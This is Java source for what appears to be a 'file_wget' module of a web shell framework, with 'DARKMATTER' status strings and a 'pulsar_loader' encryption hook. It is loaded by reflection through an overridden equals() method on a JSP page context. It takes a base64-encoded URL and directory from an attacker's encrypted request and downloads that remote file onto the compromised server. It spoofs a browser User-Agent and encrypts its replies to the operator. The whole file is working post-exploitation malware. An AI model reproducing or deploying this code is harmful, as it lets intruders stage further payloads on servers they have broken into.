import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class file_wget extends ClassLoader
{
    public file_wget(ClassLoader objParent) { super(objParent); }
    public file_wget() { super(file_wget.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
            Map<String, String> mapParams = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            String z0 = mapParams.get("z0");
            String z1 = mapParams.get("z1");

            String szURL = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8).trim();
            String szSaveDir = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();

            String szFileName = "";
            HttpURLConnection connection = null;
            InputStream isRemote = null;
            FileOutputStream fosLocal = null;
            
            try
            {
                URL url = new URL(szURL);
                connection = (HttpURLConnection)url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(15000);
                connection.setReadTimeout(15000);
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

                int nRespCode = connection.getResponseCode();
                if (nRespCode == HttpURLConnection.HTTP_OK)
                {
                    // Get file name from content-disposition
                    String szDisposition = connection.getHeaderField("Content-Disposition");
                    if (szDisposition != null)
                    {
                        Pattern p = Pattern.compile("filename=\"?([^\";]+)\"?", Pattern.CASE_INSENSITIVE);
                        Matcher m = p.matcher(szDisposition);
                        if (m.find()) {
                            szFileName = m.group(1);
                        }
                    }

                    // Get file name from URL
                    if (szURL == null || szURL.isEmpty()) {
                        String szPath = url.getPath();
                        if (szPath != null && !szPath.isEmpty()) {
                            int nLastSlash = szPath.lastIndexOf('/');
                            if (nLastSlash >= 0 && nLastSlash < szPath.length() - 1) {
                                szURL = szPath.substring(nLastSlash + 1);
                            }
                        }
                    }

                    // All failed!
                    if (szFileName == null || szFileName.isEmpty() || szFileName.equals("/")) {
                        szFileName = "download.bin";
                    }

                    // Create directory if it does not exist.
                    File dir = new File(szSaveDir);
                    if (!dir.exists()) {
                        dir.mkdirs();
                    }
                    File fileTarget = new File(dir, szFileName);
                    String szFullSavePath = fileTarget.getAbsolutePath();

                    isRemote = connection.getInputStream();
                    fosLocal = new FileOutputStream(fileTarget);
                    byte[] buffer = new byte[4096];
                    int nBytesRead;
                    while ((nBytesRead = isRemote.read(buffer)) != -1) {
                        fosLocal.write(buffer, 0, nBytesRead);
                    }

                    sb.append("{\"success\":true,\"filename\":\"" + fnEscapeJson(szFileName) + "\",\"path\":\"" + fnEscapeJson(szFullSavePath) + "\"}");
                }
                else
                {
                    sb.append("{\"success\":false,\"error\":\"HTTP error code: " + nRespCode + "\"}");
                }
            } catch (Exception exDownload) {
                sb.append("{\"success\":false,\"error\":\"Download failed: " + fnEscapeJson(exDownload.getMessage()) + "\"}");
            } finally {
                if (fosLocal != null) try { fosLocal.close(); } catch (Exception e) {}
                if (isRemote != null) try { isRemote.close(); } catch (Exception e) {}
                if (connection != null) connection.disconnect();
            }

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    private String fnEscapeJson(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\b", "\\b")
                  .replace("\f", "\\f")
                  .replace("\n", "\\n")
                  .replace("\r", "\\r")
                  .replace("\t", "\\t");
    }
}